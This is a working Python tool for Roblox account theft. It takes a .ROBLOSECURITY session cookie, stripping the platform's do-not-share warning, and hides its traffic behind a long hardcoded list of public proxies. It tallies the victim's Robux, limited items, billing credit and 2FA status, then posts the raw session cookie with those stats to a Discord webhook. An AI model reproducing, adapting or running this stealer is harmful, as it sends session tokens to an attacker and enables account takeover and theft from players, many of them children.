import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# Aapke diye gaye proxies ki list
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
socks4://217.14.192.183:1080
http://145.220.227.154:8080
http://31.76.127.171:3128
http://161.35.70.249:3128
http://145.220.227.2:3128
http://145.220.227.107:8080
socks4://195.13.169.219:4153
socks4://93.115.174.1:1080
socks5://178.252.74.29:1081
http://78.138.185.81:3128
socks5://82.21.153.14:1080
socks4://83.220.46.106:4145
http://91.107.247.193:7001
socks4://95.140.118.34:1080
socks5://83.237.92.106:1080
http://103.119.19.218:3128
http://217.114.12.153:443
socks5://145.220.227.208:8080
socks5://62.83.33.70:1080
socks5://145.220.227.187:8080
socks5://145.220.227.24:8080
socks5://79.134.4.225:1080
socks5://93.90.231.101:1080
socks5://62.83.34.101:1080
socks5://94.183.170.105:1080
http://83.171.113.43:3128
socks5://85.174.84.22:1080
socks5://89.148.196.156:1080
socks4://213.21.53.119:4153
socks4://95.178.108.189:5678
socks4://185.26.168.17:4153
http://109.195.39.103:7522
socks4://81.16.9.222:3629
http://79.137.78.133:8010
http://161.230.153.228:3128
socks5://37.193.218.66:1080
socks5://5.140.110.96:1080
socks5://109.191.10.98:1080
socks5://45.74.31.42:5042
http://46.17.51.50:8118
socks4://31.129.107.119:443
http://46.161.49.174:10809
socks5://178.206.231.147:1080
socks4://84.2.239.42:4153
socks5://85.121.183.248:1089
socks5://45.74.31.42:4008
socks4://89.43.135.181:1080
socks5://46.146.220.247:1080
socks5://91.215.189.234:1080
socks5://45.74.31.40:6207
socks5://45.74.31.42:4330
socks5://45.74.31.42:4848
socks5://45.74.31.46:17649
socks5://45.74.31.46:17383
socks5://91.243.98.96:2080
http://195.158.1.187:8026
http://198.145.118.103:8080
socks5://45.74.31.42:5437
socks5://45.74.31.46:16886
socks5://45.74.31.46:7209
http://185.238.236.226:58080
socks5://45.74.31.42:5259
socks5://109.201.65.165:1080
socks5://31.43.194.184:1080
http://44.216.83.206:3128
socks5://45.74.31.46:5722
socks5://45.74.31.42:4219
socks5://45.74.31.42:7664
socks5://45.74.31.42:4217
socks5://45.74.31.42:4357
socks5://194.67.51.210:1080
socks5://92.101.193.58:1080
socks5://45.74.31.46:6016
socks5://45.74.31.46:8756
socks5://212.103.116.73:1080
socks5://79.134.4.192:1080
socks5://172.171.169.205:3000
socks4://103.25.167.177:4153
socks5://101.32.213.44:1080
socks5://13.90.182.199:3001
socks5://178.176.118.74:1080
http://178.92.72.129:8080
http://178.92.72.54:8080
http://178.92.72.134:8080
http://134.195.196.161:40000
http://178.92.72.73:8080
socks5://45.74.31.42:4578
socks5://45.74.31.42:5845
socks5://37.16.2.124:1080
socks4://78.38.67.210:3636
http://203.205.49.2:10236
socks4://116.105.23.121:5003
socks4://187.127.140.233:1080
socks5://107.174.30.94:1080
socks5://107.174.30.93:1080
socks5://45.74.31.42:5835
socks4://171.254.218.59:1080
http://202.151.13.48:8080
socks5://45.74.31.42:5337
socks4://171.254.219.14:1080
socks5://45.74.31.42:6292
http://84.255.40.228:8998
http://103.247.23.103:1111
socks5://45.74.31.42:7551
socks5://107.174.30.92:1080
socks5://45.74.31.46:9704
http://154.88.136.182:999
socks5://45.74.31.42:4135
http://203.205.49.2:10078
socks5://45.74.31.42:4930
http://157.20.253.20:3125
socks5://45.74.31.42:4735
socks5://45.74.31.40:7041
socks4://45.132.185.56:1080
socks5://93.99.104.47:1080
socks5://113.22.224.63:1083
http://144.31.146.190:8080
http://165.101.231.107:8181
http://96.30.70.8:8081
socks5://45.74.31.42:5855
http://203.205.49.2:10177
http://8.215.25.3:2080
http://203.175.103.41:8080
socks4://8.215.25.3:2080
http://103.107.78.192:8080
socks5://187.127.140.233:1080
socks4://103.167.156.34:1080
socks5://45.74.31.42:5726
socks4://42.113.232.95:20001
http://121.46.226.221:10808
socks5://45.74.31.42:4453
http://8.215.25.3:2081
http://81.168.119.85:5443
socks5://45.74.31.42:7947
http://144.31.146.195:8080
socks5://45.74.31.42:4574
socks5://45.74.31.46:9449
http://81.90.158.110:3128
socks5://195.19.50.135:1080
socks4://45.118.77.67:1080
socks5://43.245.199.34:1080
socks5://45.74.31.42:6457
http://63.180.203.233:4591
http://103.7.4.15:8082
http://103.179.183.129:8090
socks4://171.248.209.24:1080
socks4://42.118.180.40:1042
socks5://45.74.31.42:5439
socks4://171.248.217.155:1080
http://45.194.91.7:8080
socks4://105.214.95.149:5678
socks5://42.113.76.175:20001
socks5://45.74.31.42:5566
socks5://45.74.31.42:5658
socks4://45.230.174.21:4153
socks5://34.106.133.182:40001
socks4://124.16.111.51:10090
http://43.99.60.244:8089
socks4://160.187.0.89:1080
socks5://130.193.165.54:1080
http://103.155.196.183:8080
http://139.162.78.109:3128
socks5://45.74.31.46:13735
http://185.142.156.203:80
http://103.234.237.165:80
socks5://45.74.31.42:6264
socks5://46.254.246.17:10808
socks5://45.74.31.42:4928
socks5://45.74.31.42:6655
socks5://45.74.31.46:7181
socks4://182.253.144.20:4153
socks4://103.19.78.127:1080
socks5://45.74.31.42:4889
http://180.191.141.170:5050
socks5://45.74.31.42:6185
http://54.249.49.32:8084
socks5://45.74.31.42:6537
http://89.43.132.250:8080
socks5://45.74.31.40:9875
http://46.254.246.17:10808
socks5://45.74.31.42:5668
socks5://77.239.123.7:1080
http://3.231.160.150:8998
socks4://42.114.56.80:20001
socks5://45.74.31.40:13422
socks5://109.191.114.251:1080
socks5://45.74.31.42:4375
socks5://45.74.31.42:6813
socks5://8.215.25.3:2080
socks4://109.232.106.150:52435
socks5://45.74.31.46:10317
http://43.159.54.178:80
socks5://45.74.31.42:6129
socks5://45.74.31.42:6069
socks5://45.74.31.46:15361
socks5://45.74.31.42:4363
socks5://45.74.31.40:15274
socks5://45.74.31.46:10142
http://98.94.14.234:10611
socks5://45.74.31.42:6972
socks5://45.74.31.42:6997
socks4://202.57.46.138:4145
socks4://116.104.251.199:1093
http://45.65.224.74:999
socks4://171.248.218.247:1080
socks5://45.74.31.42:4173
http://190.109.126.24:1010
socks5://45.74.31.42:9622
socks4://212.103.118.77:5678
socks5://45.74.31.46:5871
http://116.104.251.199:2077
socks5://45.74.31.40:14686
socks5://202.4.101.249:9090
socks5://45.74.31.46:14614
http://134.185.85.16:3128
http://18.222.28.236:24330
socks5://94.19.74.39:1080
socks4://89.151.134.157:3629
socks5://45.74.31.42:5002
socks5://45.74.31.42:4467
socks5://45.74.31.42:4336
http://91.92.134.21:3128
socks5://42.118.180.40:1042
socks5://45.74.31.42:6302
http://5.129.254.70:8888
http://43.156.248.220:80
socks5://45.74.31.42:6464
socks5://45.74.31.42:8347
socks5://81.211.26.237:1080
http://205.237.105.49:3129
socks5://124.16.111.51:10090
socks5://160.187.0.89:1080
socks5://195.123.166.125:9050
socks5://45.74.31.42:7910
http://116.104.251.199:2074
socks4://116.104.251.199:1074
socks5://5.175.217.103:1080
socks5://45.74.31.46:5865
socks5://45.74.31.42:6468
socks5://45.74.31.42:4738
socks5://45.74.31.40:4243
socks5://45.74.31.46:9222
socks5://45.74.31.42:7116
socks5://45.74.31.46:5209
socks4://42.112.52.66:20001
socks5://45.74.31.40:8438
socks5://45.74.31.42:5163
socks5://45.74.31.46:8918
socks5://45.74.31.42:6298
socks4://88.87.79.18:3629
socks4://89.237.33.1:51549
socks5://45.74.31.42:5554
socks5://45.74.31.42:4014
http://63.175.157.2:30005
socks4://83.218.186.22:5678
http://203.252.142.217:80
socks5://8888:8888@47.236.168.243:1080
socks5://45.74.31.42:4405
socks5://45.74.31.42:4879
socks4://116.104.251.199:1110
http://194.87.197.21:8080
socks4://95.46.105.163:4145
socks5://185.17.1.218:1080
http://102.203.101.77:8080
socks4://185.215.53.205:3629
socks5://45.74.31.42:4342
socks5://45.74.31.46:15109
socks5://45.74.31.42:6189
socks5://116.104.251.199:1073
socks5://45.74.31.42:4177
socks5://45.74.31.46:7232
http://116.104.251.199:2067
http://103.27.177.185:808
socks5://45.74.31.42:4875
socks5://90.151.107.14:1080
socks5://31.129.107.119:443
http://82.180.145.170:3129
socks5://45.74.31.42:5435
socks4://42.114.56.182:20001
socks5://45.74.31.40:8106
socks5://45.74.31.46:7640
http://116.104.251.199:2054
http://116.104.251.199:2102
socks5://94.190.40.87:1080
socks5://95.220.69.159:1080
http://212.252.73.13:8080
http://120.232.115.170:17981
socks5://45.74.31.42:7089
socks5://45.74.31.46:12810
socks5://195.19.50.130:1080
socks5://45.74.31.42:6294
socks5://45.74.31.40:10275
socks5://88888:88888@8.210.36.244:1080
socks5://45.74.31.42:5214
socks5://52.128.241.108:1080
socks5://45.74.31.46:7910
socks5://52.128.241.107:1080
socks5://45.74.31.42:5440
socks5://45.74.31.42:6936
socks5://45.74.31.42:7061
http://116.104.251.199:2068
socks5://45.74.31.42:4934
socks5://45.74.31.42:8139
socks4://91.247.92.63:5678
socks5://116.104.251.199:1110
socks5://52.128.241.109:1080
http://182.52.136.62:80
socks5://45.74.31.42:5278
http://103.27.177.186:808
socks5://45.74.31.46:10530
socks5://91.246.1.6:4431
socks5://45.74.31.42:6071
socks5://45.74.31.46:4863
http://56.228.13.15:52649
socks5://116.104.251.199:1117
socks5://116.104.251.199:1034
socks5://45.74.31.42:6825
http://131.0.120.162:9292
socks5://45.74.31.40:8828
http://120.232.115.57:17981
socks5://45.74.31.42:6006
http://124.16.111.51:10090
socks5://45.74.31.42:5113
http://158.101.99.182:1080
socks5://45.74.31.42:8597
socks5://45.74.31.42:5270
socks5://45.74.31.46:4933
socks5://45.74.31.42:5786
http://3.134.245.77:32777
socks5://45.74.31.42:4733
http://102.244.78.61:8081
socks5://81.0.49.104:18500
http://102.244.78.61:8086
http://69.171.214.128:999
socks5://82.116.60.184:1080
http://102.244.78.61:8087
socks4://42.118.180.40:1093
socks5://45.74.31.42:6815
socks5://45.74.31.42:7662
http://102.244.78.61:8089
socks4://85.105.194.113:4153
socks5://45.74.31.42:4160
http://102.244.78.61:8083
socks5://45.74.31.40:14992
socks5://45.74.31.42:7541
http://102.244.78.61:8085
http://168.144.84.188:3129
http://102.244.78.61:8080
socks5://45.74.31.40:16785
socks4://116.104.251.199:1077
socks5://109.195.215.208:1080
socks5://45.74.31.42:4645
socks4://116.104.251.199:1117
http://89.43.133.231:8080
socks5://45.74.31.46:17695
socks5://45.74.31.42:6223
socks5://45.74.31.46:10538
socks4://103.31.103.71:1080
http://102.244.78.61:8090
socks5://45.74.31.46:12776
http://102.244.78.61:8082
socks5://45.74.31.42:4540
socks5://45.74.31.42:5109
http://1.4.141.80:80
http://102.244.78.61:8088
http://103.20.102.155:2926
socks5://45.74.31.46:5569
socks5://45.74.31.46:9627
socks4://183.106.215.208:1080
socks5://45.74.31.42:5006
socks5://202.142.153.220:1080
http://34.106.133.182:40001
socks5://45.74.31.42:6090
socks5://116.104.251.199:1027
socks5://45.74.31.42:4509
http://103.124.136.219:8080
socks5://45.74.31.46:5113
socks5://45.74.31.42:6169
http://111.192.54.104:8888
socks5://45.74.31.42:8813
socks5://45.74.31.42:4842
socks5://45.74.31.42:7537
socks5://45.74.31.42:4213
socks5://45.74.31.46:11491
http://85.30.215.48:32946
socks5://45.74.31.42:5716
http://103.86.117.23:8080
socks5://45.74.31.46:5911
http://116.104.251.199:2110
http://203.205.49.2:10033
http://160.22.207.95:8082
socks5://45.74.31.42:6304
socks5://45.74.31.46:8206
http://197.224.185.3:3128
socks5://45.74.31.40:7759
socks5://45.74.31.46:9851
socks5://45.74.31.46:7238
http://103.125.117.118:5555
socks5://45.74.31.46:9410
socks5://45.74.31.46:13832
socks5://116.104.251.199:1075
socks5://45.74.31.46:8695
socks5://45.74.31.42:5996
socks5://45.74.31.46:10313
http://163.128.149.200:3128
http://190.60.62.51:999
http://103.158.13.181:8080
socks5://45.74.31.42:5448
socks5://45.74.31.42:5743
socks5://45.74.31.46:4538
socks5://45.74.31.42:4921
http://154.88.137.50:999
socks5://45.74.31.42:7670
http://78.12.246.160:24298
http://123.121.134.141:8888
socks5://45.74.31.40:11855
socks5://45.74.31.42:5556
http://103.14.111.188:3128
socks5://45.74.31.46:4167
socks5://192.141.74.246:1088
socks5://45.74.31.46:5711
http://38.58.114.145:3125
http://62.220.129.81:8080
socks5://45.74.31.46:5250
"""

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""

    raw_str = str(raw_input).strip()
    print(f"DEBUG: Step 1 (Received) -> Length: {len(raw_str)}, Start: {raw_str[:12]}...", file=sys.stderr)

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_match:
        cookie = ps_match.group(1)
        print("DEBUG: Successfully extracted clean .ROBLOSECURITY from PowerShell session block.", file=sys.stderr)
    else:
        cookie = raw_str

    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()

    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()

    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()

    clean_cookie = cookie.lstrip('.').rstrip(';').strip()
    print(f"DEBUG: Final processed cookie -> Length: {len(clean_cookie)}, Start: {clean_cookie[:12]}...", file=sys.stderr)
    return clean_cookie

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []

    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            print(f"DEBUG: Trying proxy -> {p}", file=sys.stderr)
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
            if test_res.status_code != 429:
                print(f"DEBUG: Successfully connected using proxy {p}", file=sys.stderr)
                return session, test_res
        except Exception:
            continue

    print("DEBUG: All proxies failed or timed out. Falling back to direct connection.", file=sys.stderr)
    session.proxies = {}
    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    return session, fallback_res

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        raw_arg = sys.argv[1]
        roblosecurity = extract_and_clean_cookie(raw_arg)

        session, auth_res = get_working_session(roblosecurity)
        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
        
        if auth_res.status_code in (401, 403):
            print("Error: Invalid, expired, or unauthorized cookie (401/403).", file=sys.stderr)

        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = 0
        robux = 0
        pending = 0
        rap = 0
        lim_count = 0
        premium = False
        group_count = 0
        owned = 0
        developer = False
        email_ver = False
        twofa = False
        credit = 0.0
        currency = "USD"
        adopt_me = False
        mm2 = False
        ps99 = False
        gamepasses_bought = 0

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                def get_user_info():
                    return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()

                def get_robux():
                    r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=10).json()
                    return r.get("robux", 0)

                def get_pending():
                    r = session.get(
                        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
                        params={"transactionType": "summary", "timeFrame": "Year"},
                        timeout=10
                    ).json()
                    return r.get("pendingRobuxTotal", 0)

                def get_limiteds():
                    limiteds = []
                    cursor = ""
                    while True:
                        params = {"limit": 100}
                        if cursor:
                            params["cursor"] = cursor
                        r = session.get(
                            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
                            params=params,
                            timeout=10
                        ).json()
                        for item in r.get("data", []):
                            limiteds.append(item.get("recentAveragePrice", 0))
                        cursor = r.get("nextPageCursor")
                        if not cursor:
                            break
                    return limiteds

                def get_premium():
                    r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", timeout=10)
                    return r.json() == True

                def get_groups():
                    r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10).json()
                    groups = r.get("data", [])
                    owned_count = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
                    return len(groups), owned_count

                def get_games_developer():
                    r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}", timeout=10).json()
                    return len(r.get("data", [])) > 0

                def get_account_settings():
                    r = session.get("https://accountsettings.roblox.com/v1/email", timeout=10).json()
                    ev = r.get("verified", False)
                    r2 = session.get("https://twostepverification.roblox.com/v1/metadata", timeout=10).json()
                    tf = r2.get("twoStepVerificationEnabled", False)
                    return ev, tf

                def get_credit():
                    r = session.get("https://billing.roblox.com/v1/credit", timeout=10).json()
                    return r.get("balance", 0), r.get("currencyType", "USD")

                def check_played(universe_id):
                    cursor = ""
                    while True:
                        r = session.get(
                            f"https://badges.roblox.com/v1/users/{user_id}/badges",
                            params={"limit": 100, "cursor": cursor},
                            timeout=10
                        ).json()
                        for badge in r.get("data", []):
                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
                                return True
                        cursor = r.get("nextPageCursor")
                        if not cursor:
                            return False

                def get_gamepasses_bought():
                    count = 0
                    cursor = ""
                    while True:
                        url = f"https://economy.roblox.com/v2/users/{user_id}/transactions"
                        params = {"transactionType": "Purchase", "limit": 100}
                        if cursor:
                            params["cursor"] = cursor
                        try:
                            res = session.get(url, params=params, timeout=10)
                            if res.status_code == 429:
                                time.sleep(5)
                                continue
                            if res.status_code in (401, 403):
                                break
                            res.raise_for_status()
                            body = res.json()
                            for item in body.get("data", []):
                                details = item.get("details")
                                if details and details.get("type") == "GamePass":
                                    count += 1
                            cursor = body.get("nextPageCursor")
                            if not cursor:
                                break
                        except Exception:
                            break
                    return count

                try:
                    user = get_user_info()
                    created = user.get("created", "")
                    age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days if created else 0
                except Exception:
                    pass

                try:
                    robux = get_robux()
                    pending = get_pending()
                    limiteds = get_limiteds()
                    rap = sum(limiteds)
                    lim_count = len(limiteds)
                    premium = get_premium()
                    group_count, owned = get_groups()
                    developer = get_games_developer()
                    email_ver, twofa = get_account_settings()
                    credit, currency = get_credit()
                    adopt_me = check_played(383310974)
                    mm2 = check_played(142823291)
                    ps99 = check_played(3259657279)
                    gamepasses_bought = get_gamepasses_bought()
                except Exception:
                    pass

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
        
        embed_stats = {
            "title": f"📢 Discord Notification 📢",
            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {
                    "name": "🐱 Username",
                    "value": f"```ini\n{username}\n```",
                    "inline": False
                },
                {
                    "name": "📊 Account Stats",
                    "value": f"```diff\n+ Account Age: {age_days} Days\n+ Game Visits: {developer}\n+ Group Members: {group_count}\n+ Gamepasses bought: {gamepasses_bought}\n```",
                    "inline": False
                },
                {
                    "name": "🪙 Robux",
                    "value": f"```ini\nBalance: {robux:,}\nPending: {pending:,}\n```",
                    "inline": True
                },
                {
                    "name": "💎 Limiteds",
                    "value": f"```ini\nRAP: {rap:,}\nLimiteds: {lim_count}\n```",
                    "inline": True
                },
                {
                    "name": "🚀 Summary",
                    "value": f"```ini\n{rap + robux:,}\n```",
                    "inline": True
                },
                {
                    "name": "🔥 Payments",
                    "value": f"```diff\n- Paid: {premium}\nCredit: {credit:.2f} {currency}\n```",
                    "inline": True
                },
                {
                    "name": "⭐ Games",
                    "value": f"```diff\n+ Murder Mystery 2: {mm2}\n- Pet Simulator 99: {ps99}\n- Adopt Me: {adopt_me}\n```",
                    "inline": True
                },
                {
                    "name": "🛡️ Settings",
                    "value": f"```diff\n+ Email: {'Verified' if email_ver else 'False'}\n+ 2FA: {'Set' if twofa else 'False'}\n```",
                    "inline": True
                }
            ],
            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        embed_cookie = {
            "title": "🍪 Session Cookie Data",
            "description": f"```text\n{roblosecurity}\n```",
            "color": 0x2B2D31,
            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
        }

        payload = {
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [embed_stats, embed_cookie]
        }

        max_retries = 3
        success = False
        for attempt in range(1, max_retries + 1):
            try:
                r = requests.post(webhook_url, json=payload, timeout=10)
                print(f"DEBUG: Webhook attempt {attempt} status: {r.status_code}", file=sys.stderr)
                if r.status_code in (200, 204):
                    success = True
                    print("DEBUG: Embed sent successfully!", file=sys.stderr)
                    break
                else:
                    print(f"DEBUG: Webhook attempt {attempt} failed: {r.text}", file=sys.stderr)
            except Exception as ex:
                print(f"DEBUG: Webhook attempt {attempt} error: {ex}", file=sys.stderr)

        if not success:
            print("ERROR: Webhook dispatch failed after 3 maximum attempts.", file=sys.stderr)
            sys.exit(1)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
